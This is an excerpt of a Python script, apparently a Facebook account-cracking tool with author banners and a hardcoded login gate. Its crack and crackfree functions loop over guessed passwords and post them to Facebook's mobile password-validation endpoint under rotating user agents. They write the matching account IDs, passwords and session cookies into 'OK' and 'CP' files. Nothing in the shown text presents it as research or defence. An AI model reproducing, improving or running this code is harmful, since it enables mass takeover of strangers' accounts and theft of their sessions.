...
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY FB ACCOUNT")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100093430747521')
#------------------[ Fre nzy-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/ARNAV.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
while attemps < 12345677901:
    ...
    if username == 'MANISH' and password == 'KOLADOKHAU':
        print(' \033[0;92mYou Have Successfully Logged in.')
        break
  
logo =""" 
         
                                                              888888 88""Yb 888888   88b 88 8888P Yb  dP   
88__   88__dP 88__     88Yb88   dP   YbdP    
88""   88"Yb  88""     88 Y88  dP     8P     
88     88  Yb 888888   88  Y8 d8888  dP      
...
\037 
   ...
   ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
   ║\33[0;41m        [ WORKING WIFI  ]       \033[0;92m║
   ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
   \033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
   ║    Author                   • \33[1;38mSM-MANISH ]\33[1;38m    ║\033[1;31m 
   ║    Facebook                 • Fre nzyKing ]  ║  \033[1;97m  
   ║    Github                   • \33[1;38mFre Nzy ]  ║\33[1;34m   
...
os.system('espeak -a 300 " Welcome,   to,  MANISH,  King,  Tools"')
pass
...
def passwrd():
    ...
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mJAY MANISH VAN Speed Up KO LAAGI')
    print('\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}•[MANISHM1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[MANISH-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[MANISH-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " MANISH,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[MANISH-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•MANISH-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•MANISH-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  MANISH,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
